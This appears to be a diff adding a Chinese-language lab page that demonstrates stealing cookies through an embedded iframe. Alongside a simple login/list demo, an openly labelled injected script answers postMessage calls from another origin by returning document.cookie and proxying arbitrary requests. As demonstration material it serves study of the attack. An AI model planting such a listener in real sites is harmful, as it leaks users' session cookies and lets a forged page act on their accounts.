@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    <div>
+      <h1>B2 iframe 内嵌页面 获取cookie</h1>
+      <button onclick="login()">登录</button>
+      <button onclick="getList()">拿数据</button>
+      <ul class="box"></ul>
+      <div class="tip"></div>
+    </div>
+  </body>
+  <script>
+    async function login() {
+      const response = await fetch("http://localhost:4000/login", {
+        method: "POST",
+      });
+      const res = await response.json();
+      console.log(res, "writeCookie");
+      if (res.data === "success") {
+        document.querySelector(".tip").innerHTML = "登录成功， 可以拿数据";
+      }
+    }
+
+    async function getList() {
+      const response = await fetch("http://localhost:4000/list", {
+        method: "GET",
+      });
+
+      if (response.status === 500) {
+        document.querySelector(".tip").innerHTML = "cookie失效，请先登录！";
+        document.querySelector(".box").innerHTML = "";
+      } else {
+        document.querySelector(".tip").innerHTML = "";
+        const data = await response.json();
+        let html = "";
+        data.map((el) => {
+          html += `<div>${el.id} - ${el.name}</div>`;
+        });
+        document.querySelector(".box").innerHTML = html;
+      }
+    }
+  </script>
+
+  <!-- 被注入攻击脚本，或者获取 cookie 传递回去，或者直接通过这里发送请求 -->
+  <script>
+    window.addEventListener("message", async function (e) {
+      if (e.origin === "http://localhost:5501") {
+        if (e.data.url === "/cookie") {
+          e.source.postMessage(
+            {
+              url: "/cookie",
+              data: document.cookie,
+            },
+            e.origin
+          );
+        } else {
+          const response = await fetch(e.data.url, e.data);
+          const result = await response.json();
+          console.log("发回伪造页面消息", result);
+          e.source.postMessage(
+            {
+              url: e.data.url,
+              data: result,
+            },
+            e.origin
+          );
+        }
+      }
+    });
+  </script>
+</html>
